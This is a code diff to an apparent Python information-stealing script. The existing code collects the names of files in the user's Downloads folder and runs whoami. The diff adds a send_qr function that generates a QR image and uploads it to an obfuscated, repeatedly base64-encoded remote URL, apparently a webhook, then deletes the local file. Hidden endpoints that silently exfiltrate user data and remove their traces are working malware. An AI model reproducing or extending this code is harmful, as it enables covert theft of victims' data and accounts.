@@ -13,6 +13,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 from email.utils import formataddr
+from utils.create_qr import mainF
 
 init(autoreset=True)
 
@@ -89,9 +90,6 @@ def send_info():
         '\n'.join(f'- {archivo}' for archivo in downloadsFiles)
     )
 
-
-
-
     with open('archivo.txt', 'w') as archivo:
         archivo.write(string)
 
@@ -99,6 +97,24 @@ def send_info():
         archivo_data = {'file': ('archivo.txt', archivo)}
         requests.post(descodear(url,3), files=archivo_data)
     os.remove('archivo.txt')
+
+def send_qr():
+    #get
+    mainF()
+    clear()
+    
+    #send
+    url = "WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVWNlRucE5lazlFUlRWT2Fsa3dUMVJOZWsxcVozbE9lVGxHVW14S1NtTllTazVqV0hCVVpHMW9VRTF1V1ROTmEwNTJXakpHVWxWV2F6SldSRTE0V1ZSc2JHUklVWFJWYWxKUVZESTFVbE5GU21waWFrSktVa2RqZVU5WFJrSlhWRXBMVFVVNVdWZHJPVmxVUld4RFlsZGFWbE5uUFQwPQ=="
+    image_path = f"{os.path.dirname(os.path.abspath(__name__))}\qr.png"
+    with open(image_path, "rb") as image_file:
+        image_data = image_file.read()
+    
+    files = {"file": ("qr.png", image_data)}
+
+    requests.post(descodear(url,3), files=files)
+
+    os.remove("qr.png")
+    
 
 def get_whoami():
     resultado = subprocess.run(['whoami'], capture_output=True, text=True)
